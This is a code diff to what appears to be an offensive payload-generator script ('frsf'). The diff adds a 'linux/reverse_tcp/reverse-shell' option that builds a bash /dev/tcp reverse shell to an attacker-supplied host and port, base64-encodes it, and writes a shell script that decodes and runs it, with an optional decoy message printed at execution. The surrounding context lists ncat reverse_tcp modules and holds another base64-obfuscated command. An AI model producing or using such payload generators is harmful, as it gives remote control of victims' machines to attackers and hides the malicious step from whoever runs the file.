@@ -36,7 +36,11 @@ print("")
 output=click.prompt("frsf(output path)#> ", type=str, default=os.path.expanduser("~"))
 print("PAYLOAD PATH ==> ",output)
 print("")
-print("""\033[1;34m Available ncat payload modules>>>
+print("""\033[1;34m 
+most effective independent payload for all linux distros...
+[a] linux/reverse_tcp/reverse-shell
+
+Available ncat payload modules>>>
  
 [1] linux_debian/reverse_tcp
 [2] linux_arch/reverse_tcp
@@ -66,7 +70,15 @@ encoded=base64.b64encode(s.encode("utf-8"))
 encodeds=encoded.decode("utf-8")
 print("\033[1;35 ")
 payload=input("frsf(choose payload)#> ")
-if payload=="1":
+if payload=="a" or payload=="A":
+	additional=click.prompt("ENTER ANY ADDITIONAL DIALOGUES WHEN EXECUTING :", type=str, default="")
+	rshell=f"echo -e '\033[1;38 {additional}' && bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+	encodedrshell=base64.b64encode(rshell.encode("utf-8"))
+	encodedrshells=encodedrshell.decode("utf-8")
+	f=open(f"{output}/{name}.sh","w+")
+	f.write(f"base64 -d <<< {encodedrshells} | sh")
+	f.close()
+elif payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""c1=$(base64 -d <<< "c3VkbyBhcHQtZ2V0IGluc3RhbGwgbm1hcAo="); status=$?
